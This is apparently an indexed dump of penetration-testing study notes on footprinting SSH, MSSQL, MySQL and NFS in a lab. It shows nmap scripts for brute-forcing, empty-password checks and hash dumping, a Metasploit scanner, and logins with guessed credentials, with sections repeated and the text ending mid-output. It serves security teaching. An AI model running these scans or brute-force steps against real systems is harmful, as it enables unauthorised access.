Authentication Method hrmns@htb[/htb]$ ssh -v john@10.129.14.132 OpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f 31 Mar 2020 debug1: Reading configuration data /etc/ssh/ssh_config ...SNIP... debug1: Authentications that can continue: publickey,password,keyboard-interactive For potential brute-force attacks, we can specify the authentication method with the SSH client option PreferredAuthentications . hrmns@htb[/htb]$ ssh -v john@10.129.14.132 -o PreferredAuthentications = password OpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f 31 Mar 2020 debug1: Reading configuration data /etc/ssh/ssh_config ...SNIP... debug1: Authentications that can continue: publickey,password,keyboard-interactive debug1: Next authentication method: password john@10.129.14.132's password:","title":"Linux"},{"location":"footprinting/linux_remote_management_protocol/#default-configuration","text":"The sshd_config file, responsible for the OpenSSH server, has only a few of the settings configured by default. hrmns@htb[/htb]$ cat /etc/ssh/sshd_config | grep -v \"#\" | sed -r '/^\\s*$/d' Include /etc/ssh/sshd_config.d/*.conf ChallengeResponseAuthentication no UsePAM yes X11Forwarding yes PrintMotd no AcceptEnv LANG LC_* Subsystem sftp /usr/lib/openssh/sftp-server","title":"Default Configuration"},{"location":"footprinting/linux_remote_management_protocol/#dangerous-settings","text":"Despite the SSH protocol being one of the most secure protocols available today, some misconfigurations can still make the SSH server vulnerable to easy-to-execute attacks. Setting Description PasswordAuthentication yes Allows password-based authentication. PermitEmptyPasswords yes Allows the use of empty passwords. PermitRootLogin yes Allows to log in as the root user. Protocol 1 Uses an outdated version of encryption. X11Forwarding yes Allows X11 forwarding for GUI applications. AllowTcpForwarding yes Allows forwarding of TCP ports. PermitTunnel Allows tunneling. DebianBanner yes Displays a specific banner when logging in.","title":"Dangerous Settings"},{"location":"footprinting/linux_remote_management_protocol/#footprinting-the-service","text":"One of the tools we can use to fingerprint the SSH server is ssh-audit . It checks the client-side and server-side configuration and shows some general information and which encryption algorithms are still used by the client and server. hrmns@htb[/htb]$ git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit hrmns@htb[/htb]$ ./ssh-audit.py 10 .129.14.132 # general (gen) banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3 (gen) software: OpenSSH 8.2p1 (gen) compatibility: OpenSSH 7.4+, Dropbear SSH 2018.76+ (gen) compression: enabled (zlib@openssh.com) # key exchange algorithms (kex) curve25519-sha256 -- [info] available since OpenSSH 7.4, Dropbear SSH 2018.76 (kex) curve25519-sha256@libssh.org -- [info] available since OpenSSH 6.5, Dropbear SSH 2013.62 (kex) ecdh-sha2-nistp256 -- [fail] using weak elliptic curves `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62 (kex) ecdh-sha2-nistp384 -- [fail] using weak elliptic curves `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62 (kex) ecdh-sha2-nistp521 -- [fail] using weak elliptic curves `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62 (kex) diffie-hellman-group-exchange-sha256 (2048-bit) -- [info] available since OpenSSH 4.4 (kex) diffie-hellman-group16-sha512 -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73 (kex) diffie-hellman-group18-sha512 -- [info] available since OpenSSH 7.3 (kex) diffie-hellman-group14-sha256 -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73 # host-key algorithms (key) rsa-sha2-512 (3072-bit) -- [info] available since OpenSSH 7.2 (key) rsa-sha2-256 (3072-bit) -- [info] available since OpenSSH 7.2 (key) ssh-rsa (3072-bit) -- [fail] using weak hashing algorithm `- [info] available since OpenSSH 2.5.0, Dropbear SSH 0.28 `- [info] a future deprecation notice has been issued in OpenSSH 8.2: https://www.openssh.com/txt/release-8.2 (key) ecdsa-sha2-nistp256 -- [fail] using weak elliptic curves `- [warn] using weak random number generator could reveal the key `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62 (key) ssh-ed25519 -- [info] available since OpenSSH 6.5 ...SNIP... The first thing we can see in the first few lines of the output is the banner that reveals the version of the OpenSSH server. The previous versions had some vulnerabilities, such as CVE-2020-14145 , which allowed the attacker the capability to Man-In-The-Middle and attack the initial connection attempt. The detailed output of the connection setup with the OpenSSH server can also often provide important information, such as which authentication methods the server can use. Change Authentication Method hrmns@htb[/htb]$ ssh -v john@10.129.14.132 OpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f 31 Mar 2020 debug1: Reading configuration data /etc/ssh/ssh_config ...SNIP... debug1: Authentications that can continue: publickey,password,keyboard-interactive For potential brute-force attacks, we can specify the authentication method with the SSH client option PreferredAuthentications . hrmns@htb[/htb]$ ssh -v john@10.129.14.132 -o PreferredAuthentications = password OpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f 31 Mar 2020 debug1: Reading configuration data /etc/ssh/ssh_config ...SNIP... debug1: Authentications that can continue: publickey,password,keyboard-interactive debug1: Next authentication method: password john@10.129.14.132's password:","title":"Footprinting the Service"},{"location":"footprinting/mssql/","text":"Microsoft SQL ( MSSQL ) is Microsoft's SQL-based relational database management system. Unlike MySQL, MSSQL is closed source and was initially written to run on Windows operating systems. MSSQL Clients \u00b6 SQL Server Management Studio ( SSMS ) comes as a feature that can be installed with the MSSQL install package or can be downloaded & installed separately. It is commonly installed on the server for initial configuration and long-term management of databases by admins. Pentester's may find Impacket's mssqlclient.py to be the most useful due to SecureAuthCorp's Impacket project being present on many pentesting distributions at install. hrmns@htb[/htb]$ locate mssqlclient /usr/bin/impacket-mssqlclient /usr/share/doc/python3-impacket/examples/mssqlclient.py MSSQL Databases \u00b6 MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server. Default System Database Description master Tracks all system information for an SQL server instance model Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database msdb The SQL Server Agent uses this database to schedule jobs & alerts tempdb Stores temporary objects resource Read-only database containing system objects included with SQL server Source: System Databases Microsoft Doc Default Configuration \u00b6 When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as NT SERVICE\\MSSQLSERVER . Connecting from the client-side is possible through Windows Authentication, and by default, encryption is not enforced when attempting to connect. Authentication being set to Windows Authentication means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system. Using Active Directory can be ideal for auditing activity and controlling access in a Windows environment, but if an account is compromised, it could lead to privilege escalation and lateral movement across a Windows domain environment. Dangerous Settings \u00b6 It can be beneficial to place ourselves in the perspective of an IT administrator when we are on an engagement. This mindset can help us remember to look for various settings that may have been misconfigured or configured in a dangerous manner by an admin. It only takes one tiny misconfiguration that could compromise a critical server or service on the network. This applies to just about every network service and server role that can be configured, including MSSQL. We may benefit from looking into the following: MSSQL clients not using encryption to connect to the MSSQL server The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates The use of named pipes Weak & default sa credentials. Admins may forget to disable this account Default tcp port 1433 that MSSQL listens on. Below, we can see the hostname , database instance name , software version of MSSQL and named pipes are enabled . hrmns@htb[/htb]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port = 1433 ,mssql.username = sa,mssql.password = ,mssql.instance-name = MSSQLSERVER -sV -p 1433 10 .129.201.248 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 09:40 EST Nmap scan report for 10.129.201.248 Host is up (0.15s latency). PORT STATE SERVICE VERSION 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM | ms-sql-ntlm-info: | Target_Name: SQL-01 | NetBIOS_Domain_Name: SQL-01 | NetBIOS_Computer_Name: SQL-01 | DNS_Domain_Name: SQL-01 | DNS_Computer_Name: SQL-01 |_ Product_Version: 10.0.17763 Host script results: | ms-sql-dac: |_ Instance: MSSQLSERVER; DAC port: 1434 (connection failed) | ms-sql-info: | Windows server name: SQL-01 | 10.129.201.248\\MSSQLSERVER: | Instance name: MSSQLSERVER | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false | TCP port: 1433 | Named pipe: \\\\10.129.201.248\\pipe\\sql\\query |_ Clustered: false Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds Metasploit to run an auxiliary scanner called mssql_ping that will scan the MSSQL service and provide helpful information in our footprinting process. msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248 rhosts => 10.129.201.248 msf6 auxiliary(scanner/mssql/mssql_ping) > run [*] 10.129.201.248: - SQL Server information for 10.129.201.248: [+] 10.129.201.248: - ServerName = SQL-01 [+] 10.129.201.248: - InstanceName = MSSQLSERVER [+] 10.129.201.248: - IsClustered = No [+] 10.129.201.248: - Version = 15.0.2000.5 [+] 10.129.201.248: - tcp = 1433 [+] 10.129.201.248: - np = \\\\SQL-01\\pipe\\sql\\query [*] 10.129.201.248: - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL ( Transact-SQL ). hrmns@htb[/htb]$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation Password: [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(SQL-01): Line 1: Changed database context to 'master'. [*] INFO(SQL-01): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commands SQL> select name from sys.databases name -------------------------------------------------------------------------------------- master tempdb model msdb Transactions","title":"MSSQL"},{"location":"footprinting/mssql/#mssql-clients","text":"SQL Server Management Studio ( SSMS ) comes as a feature that can be installed with the MSSQL install package or can be downloaded & installed separately. It is commonly installed on the server for initial configuration and long-term management of databases by admins. Pentester's may find Impacket's mssqlclient.py to be the most useful due to SecureAuthCorp's Impacket project being present on many pentesting distributions at install. hrmns@htb[/htb]$ locate mssqlclient /usr/bin/impacket-mssqlclient /usr/share/doc/python3-impacket/examples/mssqlclient.py","title":"MSSQL Clients"},{"location":"footprinting/mssql/#mssql-databases","text":"MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server. Default System Database Description master Tracks all system information for an SQL server instance model Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database msdb The SQL Server Agent uses this database to schedule jobs & alerts tempdb Stores temporary objects resource Read-only database containing system objects included with SQL server Source: System Databases Microsoft Doc","title":"MSSQL Databases"},{"location":"footprinting/mssql/#default-configuration","text":"When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as NT SERVICE\\MSSQLSERVER . Connecting from the client-side is possible through Windows Authentication, and by default, encryption is not enforced when attempting to connect. Authentication being set to Windows Authentication means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system. Using Active Directory can be ideal for auditing activity and controlling access in a Windows environment, but if an account is compromised, it could lead to privilege escalation and lateral movement across a Windows domain environment.","title":"Default Configuration"},{"location":"footprinting/mssql/#dangerous-settings","text":"It can be beneficial to place ourselves in the perspective of an IT administrator when we are on an engagement. This mindset can help us remember to look for various settings that may have been misconfigured or configured in a dangerous manner by an admin. It only takes one tiny misconfiguration that could compromise a critical server or service on the network. This applies to just about every network service and server role that can be configured, including MSSQL. We may benefit from looking into the following: MSSQL clients not using encryption to connect to the MSSQL server The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates The use of named pipes Weak & default sa credentials. Admins may forget to disable this account Default tcp port 1433 that MSSQL listens on. Below, we can see the hostname , database instance name , software version of MSSQL and named pipes are enabled . hrmns@htb[/htb]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port = 1433 ,mssql.username = sa,mssql.password = ,mssql.instance-name = MSSQLSERVER -sV -p 1433 10 .129.201.248 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 09:40 EST Nmap scan report for 10.129.201.248 Host is up (0.15s latency). PORT STATE SERVICE VERSION 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM | ms-sql-ntlm-info: | Target_Name: SQL-01 | NetBIOS_Domain_Name: SQL-01 | NetBIOS_Computer_Name: SQL-01 | DNS_Domain_Name: SQL-01 | DNS_Computer_Name: SQL-01 |_ Product_Version: 10.0.17763 Host script results: | ms-sql-dac: |_ Instance: MSSQLSERVER; DAC port: 1434 (connection failed) | ms-sql-info: | Windows server name: SQL-01 | 10.129.201.248\\MSSQLSERVER: | Instance name: MSSQLSERVER | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false | TCP port: 1433 | Named pipe: \\\\10.129.201.248\\pipe\\sql\\query |_ Clustered: false Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds Metasploit to run an auxiliary scanner called mssql_ping that will scan the MSSQL service and provide helpful information in our footprinting process. msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248 rhosts => 10.129.201.248 msf6 auxiliary(scanner/mssql/mssql_ping) > run [*] 10.129.201.248: - SQL Server information for 10.129.201.248: [+] 10.129.201.248: - ServerName = SQL-01 [+] 10.129.201.248: - InstanceName = MSSQLSERVER [+] 10.129.201.248: - IsClustered = No [+] 10.129.201.248: - Version = 15.0.2000.5 [+] 10.129.201.248: - tcp = 1433 [+] 10.129.201.248: - np = \\\\SQL-01\\pipe\\sql\\query [*] 10.129.201.248: - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL ( Transact-SQL ). hrmns@htb[/htb]$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation Password: [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(SQL-01): Line 1: Changed database context to 'master'. [*] INFO(SQL-01): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commands SQL> select name from sys.databases name -------------------------------------------------------------------------------------- master tempdb model msdb Transactions","title":"Dangerous Settings"},{"location":"footprinting/mysql/","text":"MySQL is an open-source SQL relational database management system developed and supported by Oracle. MySQL works according to the client-server principle and consists of a MySQL server and one or more MySQL clients. Default Configuration \u00b6 hrmns@htb[/htb]$ sudo apt install mysql-server -y hrmns@htb[/htb]$ cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v \"#\" | sed -r '/^\\s*$/d' [client] port = 3306 socket = /var/run/mysqld/mysqld.sock [mysqld_safe] pid-file = /var/run/mysqld/mysqld.pid socket = /var/run/mysqld/mysqld.sock nice = 0 [mysqld] skip-host-cache skip-name-resolve user = mysql pid-file = /var/run/mysqld/mysqld.pid socket = /var/run/mysqld/mysqld.sock port = 3306 basedir = /usr datadir = /var/lib/mysql tmpdir = /tmp lc-messages-dir = /usr/share/mysql explicit_defaults_for_timestamp symbolic-links=0 !includedir /etc/mysql/conf.d/ Dangerous Settings \u00b6 Settings Description user Sets which user the MySQL service will run as. password Sets the password for the MySQL user. admin_address The IP address on which to listen for TCP/IP connections on the administrative network interface. debug This variable indicates the current debugging settings sql_warnings This variable controls whether single-row INSERT statements produce an information string if warnings occur. secure_file_priv This variable is used to limit the effect of data import and export operations. The settings user , password , and admin_address are security-relevant because the entries are made in plain text. Often, the rights for the configuration file of the MySQL server are not assigned correctly. If we get another way to read files or even a shell, we can see the file and the username and password for the MySQL server. Footprinting the Service \u00b6 Usually, the MySQL server runs on TCP port 3306 hrmns@htb[/htb]$ sudo nmap 10 .129.14.128 -sV -sC -p3306 --script mysql* Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 00:53 CEST Nmap scan report for 10.129.14.128 Host is up (0.00021s latency). PORT STATE SERVICE VERSION 3306/tcp open nagios-nsca Nagios NSCA | mysql-brute: | Accounts: | root:<empty> - Valid credentials |_ Statistics: Performed 45010 guesses in 5 seconds, average tps: 9002.0 |_mysql-databases: ERROR: Script execution failed (use -d to debug) |_mysql-dump-hashes: ERROR: Script execution failed (use -d to debug) | mysql-empty-password: |_ root account has empty password | mysql-enum: | Valid usernames: | root:<empty> - Valid credentials | netadmin:<empty> - Valid credentials | guest:<empty> - Valid credentials | user:<empty> - Valid credentials | web:<empty> - Valid credentials | sysadmin:<empty> - Valid credentials | administrator:<empty> - Valid credentials | webadmin:<empty> - Valid credentials | admin:<empty> - Valid credentials | test:<empty> - Valid credentials |_ Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0 | mysql-info: | Protocol: 10 | Version: 8.0.26-0ubuntu0.20.04.1 | Thread ID: 13 | Capabilities flags: 65535 | Some Capabilities: SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolOld, LongPassword, DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults | Status: Autocommit | Salt: YTSgMfqvx\\x0F\\x7F\\x16\\&\\x1EAeK>0 |_ Auth Plugin Name: caching_sha2_password |_mysql-users: ERROR: Script execution failed (use -d to debug) |_mysql-variables: ERROR: Script execution failed (use -d to debug) |_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug) MAC Address: 00:00:00:00:00:00 (VMware) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.21 seconds As with all our scans, we must be careful with the results and manually confirm the information obtained because some of the information might turn out to be a false-positive. This scan above is an excellent example of this, as we know for a fact that the target MySQL server does not use an empty password for the user root , but a fixed password. We can test this: hrmns@htb[/htb]$ mysql -u root -h 10 .129.14.132 ERROR 1045 (28000): Access denied for user 'root'@'10.129.14.1' (using password: NO) If we use a password that we have guessed or found through our research, we will be able to log in: hrmns@htb[/htb]$ mysql -u root -pP4SSw0rd 10 .129.14.128 Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MySQL connection id is 150165 Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu) Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. MySQL [(none)]> show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | +--------------------+ 4 rows in set (0.006 sec) MySQL [(none)]> select version(); +-------------------------+ | version() | +-------------------------+ | 8.0.27-0ubuntu0.20.04.1 | +-------------------------+ 1 row in set (0.001 sec) MySQL [(none)]> use mysql; MySQL [mysql]> show tables; +------------------------------------------------------+ | Tables_in_mysql | +------------------------------------------------------+ | columns_priv | | component | | db | | default_roles | | engine_cost | | func | | general_log | | global_grants | | gtid_executed | | help_category | | help_keyword | | help_relation | | help_topic | | innodb_index_stats | | innodb_table_stats | | password_history | ...SNIP... | user | +------------------------------------------------------+ 37 rows in set (0.002 sec) The most important databases for the MySQL server are the system schema ( sys ) and information schema ( information_schema ). The system schema contains tables, information, and metadata necessary for management. More about this database can be found in the reference manual of MySQL. mysql> use sys; mysql> show tables; +-----------------------------------------------+ | Tables_in_sys | +-----------------------------------------------+ | host_summary | | host_summary_by_file_io | | host_summary_by_file_io_type | | host_summary_by_stages | | host_summary_by_statement_latency | | host_summary_by_statement_type | | innodb_buffer_stats_by_schema | | innodb_buffer_stats_by_table | | innodb_lock_waits | | io_by_thread_by_latency | ...SNIP... | x$waits_global_by_latency | +-----------------------------------------------+ mysql> select host, unique_users from host_summary; +-------------+--------------+ | host | unique_users | +-------------+--------------+ | 10.129.14.1 | 1 | | localhost | 2 | +-------------+--------------+ 2 rows in set (0,01 sec) Command Description mysql -u <user> -p<password> <IP address> Connect to the MySQL server. There should not be a space between the '-p' flag, and the password. show databases; Show all databases. use <database>; Select one of the existing databases. show tables; Show all available tables in the selected database. show columns from <table>; Show all columns in the selected database. select * from <table>; Show everything in the desired table. select * from <table> where <column> = \"<string>\"; Search for needed string in the desired table.","title":"MySQL"},{"location":"footprinting/mysql/#default-configuration","text":"hrmns@htb[/htb]$ sudo apt install mysql-server -y hrmns@htb[/htb]$ cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v \"#\" | sed -r '/^\\s*$/d' [client] port = 3306 socket = /var/run/mysqld/mysqld.sock [mysqld_safe] pid-file = /var/run/mysqld/mysqld.pid socket = /var/run/mysqld/mysqld.sock nice = 0 [mysqld] skip-host-cache skip-name-resolve user = mysql pid-file = /var/run/mysqld/mysqld.pid socket = /var/run/mysqld/mysqld.sock port = 3306 basedir = /usr datadir = /var/lib/mysql tmpdir = /tmp lc-messages-dir = /usr/share/mysql explicit_defaults_for_timestamp symbolic-links=0 !includedir /etc/mysql/conf.d/","title":"Default Configuration"},{"location":"footprinting/mysql/#dangerous-settings","text":"Settings Description user Sets which user the MySQL service will run as. password Sets the password for the MySQL user. admin_address The IP address on which to listen for TCP/IP connections on the administrative network interface. debug This variable indicates the current debugging settings sql_warnings This variable controls whether single-row INSERT statements produce an information string if warnings occur. secure_file_priv This variable is used to limit the effect of data import and export operations. The settings user , password , and admin_address are security-relevant because the entries are made in plain text. Often, the rights for the configuration file of the MySQL server are not assigned correctly. If we get another way to read files or even a shell, we can see the file and the username and password for the MySQL server.","title":"Dangerous Settings"},{"location":"footprinting/mysql/#footprinting-the-service","text":"Usually, the MySQL server runs on TCP port 3306 hrmns@htb[/htb]$ sudo nmap 10 .129.14.128 -sV -sC -p3306 --script mysql* Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 00:53 CEST Nmap scan report for 10.129.14.128 Host is up (0.00021s latency). PORT STATE SERVICE VERSION 3306/tcp open nagios-nsca Nagios NSCA | mysql-brute: | Accounts: | root:<empty> - Valid credentials |_ Statistics: Performed 45010 guesses in 5 seconds, average tps: 9002.0 |_mysql-databases: ERROR: Script execution failed (use -d to debug) |_mysql-dump-hashes: ERROR: Script execution failed (use -d to debug) | mysql-empty-password: |_ root account has empty password | mysql-enum: | Valid usernames: | root:<empty> - Valid credentials | netadmin:<empty> - Valid credentials | guest:<empty> - Valid credentials | user:<empty> - Valid credentials | web:<empty> - Valid credentials | sysadmin:<empty> - Valid credentials | administrator:<empty> - Valid credentials | webadmin:<empty> - Valid credentials | admin:<empty> - Valid credentials | test:<empty> - Valid credentials |_ Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0 | mysql-info: | Protocol: 10 | Version: 8.0.26-0ubuntu0.20.04.1 | Thread ID: 13 | Capabilities flags: 65535 | Some Capabilities: SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolOld, LongPassword, DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults | Status: Autocommit | Salt: YTSgMfqvx\\x0F\\x7F\\x16\\&\\x1EAeK>0 |_ Auth Plugin Name: caching_sha2_password |_mysql-users: ERROR: Script execution failed (use -d to debug) |_mysql-variables: ERROR: Script execution failed (use -d to debug) |_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug) MAC Address: 00:00:00:00:00:00 (VMware) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.21 seconds As with all our scans, we must be careful with the results and manually confirm the information obtained because some of the information might turn out to be a false-positive. This scan above is an excellent example of this, as we know for a fact that the target MySQL server does not use an empty password for the user root , but a fixed password. We can test this: hrmns@htb[/htb]$ mysql -u root -h 10 .129.14.132 ERROR 1045 (28000): Access denied for user 'root'@'10.129.14.1' (using password: NO) If we use a password that we have guessed or found through our research, we will be able to log in: hrmns@htb[/htb]$ mysql -u root -pP4SSw0rd 10 .129.14.128 Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MySQL connection id is 150165 Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu) Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. MySQL [(none)]> show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | +--------------------+ 4 rows in set (0.006 sec) MySQL [(none)]> select version(); +-------------------------+ | version() | +-------------------------+ | 8.0.27-0ubuntu0.20.04.1 | +-------------------------+ 1 row in set (0.001 sec) MySQL [(none)]> use mysql; MySQL [mysql]> show tables; +------------------------------------------------------+ | Tables_in_mysql | +------------------------------------------------------+ | columns_priv | | component | | db | | default_roles | | engine_cost | | func | | general_log | | global_grants | | gtid_executed | | help_category | | help_keyword | | help_relation | | help_topic | | innodb_index_stats | | innodb_table_stats | | password_history | ...SNIP... | user | +------------------------------------------------------+ 37 rows in set (0.002 sec) The most important databases for the MySQL server are the system schema ( sys ) and information schema ( information_schema ). The system schema contains tables, information, and metadata necessary for management. More about this database can be found in the reference manual of MySQL. mysql> use sys; mysql> show tables; +-----------------------------------------------+ | Tables_in_sys | +-----------------------------------------------+ | host_summary | | host_summary_by_file_io | | host_summary_by_file_io_type | | host_summary_by_stages | | host_summary_by_statement_latency | | host_summary_by_statement_type | | innodb_buffer_stats_by_schema | | innodb_buffer_stats_by_table | | innodb_lock_waits | | io_by_thread_by_latency | ...SNIP... | x$waits_global_by_latency | +-----------------------------------------------+ mysql> select host, unique_users from host_summary; +-------------+--------------+ | host | unique_users | +-------------+--------------+ | 10.129.14.1 | 1 | | localhost | 2 | +-------------+--------------+ 2 rows in set (0,01 sec) Command Description mysql -u <user> -p<password> <IP address> Connect to the MySQL server. There should not be a space between the '-p' flag, and the password. show databases; Show all databases. use <database>; Select one of the existing databases. show tables; Show all available tables in the selected database. show columns from <table>; Show all columns in the selected database. select * from <table>; Show everything in the desired table. select * from <table> where <column> = \"<string>\"; Search for needed string in the desired table.","title":"Footprinting the Service"},{"location":"footprinting/nfs/","text":"Network File System ( NFS ) is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local. However, it uses an entirely different protocol. NFS is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers. Default Config \u00b6 The /etc/exports file contains a table of physical filesystems on an NFS server accessible by the clients. The NFS Exports Table shows which options it accepts and thus indicates which options are available to us. hrmns@htb[/htb]$ cat /etc/exports # /etc/exports: the access control list for filesystems which may be exported # to NFS clients. See exports ( 5 ) . # # Example for NFSv2 and NFSv3: # /srv/homes hostname1 ( rw,sync,no_subtree_check ) hostname2 ( ro,sync,no_subtree_check ) # # Example for NFSv4: # /srv/nfs4 gss/krb5i ( rw,sync,fsid = 0 ,crossmnt,no_subtree_check ) # /srv/nfs4/homes gss/krb5i ( rw,sync,no_subtree_check ) The default exports file also contains some examples of configuring NFS shares. First, the folder is specified and made available to others, and then the rights they will have on this NFS share are connected to a host or a subnet. Finally, additional options can be added to the hosts or subnets. Creating entry \u00b6 root@nfs:~# echo '/mnt/nfs 10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports root@nfs:~# systemctl restart nfs-kernel-server root@nfs:~# exportfs /mnt/nfs 10.129.14.0/24 Dangerous Settings \u00b6 Option Description rw Read and write permissions. insecure Ports above 1024 will be used. nohide If another file system was mounted below an exported directory, this directory is exported by its own exports entry. no_root_squash All files created by root are kept with the UID/GID 0. Footprinting the Server \u00b6 When footprinting NFS, the TCP ports 111 and 2049 are essential. hrmns@htb[/htb]$ sudo nmap 10 .129.14.128 -p111,2049 -sV -sC Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:12 CEST Nmap scan report for 10.129.14.128 Host is up (0.00018s latency). PORT STATE SERVICE VERSION 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 3 2049/udp nfs | 100003 3 2049/udp6 nfs | 100003 3,4 2049/tcp nfs | 100003 3,4 2049/tcp6 nfs | 100005 1,2,3 41982/udp6 mountd | 100005 1,2,3 45837/tcp mountd | 100005 1,2,3 47217/tcp6 mountd | 100005 1,2,3 58830/udp mountd | 100021 1,3,4 39542/udp nlockmgr | 100021 1,3,4 44629/tcp nlockmgr | 100021 1,3,4 45273/tcp6 nlockmgr | 100021 1,3,4 47524/udp6 nlockmgr | 100227 3 2049/tcp nfs_acl | 100227 3 2049/tcp6 nfs_acl | 100227 3 2049/udp nfs_acl |_ 100227 3 2049/udp6 nfs_acl 2049/tcp open nfs_acl 3 (RPC #100227) MAC Address: 00:00:00:00:00:00 (VMware) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) 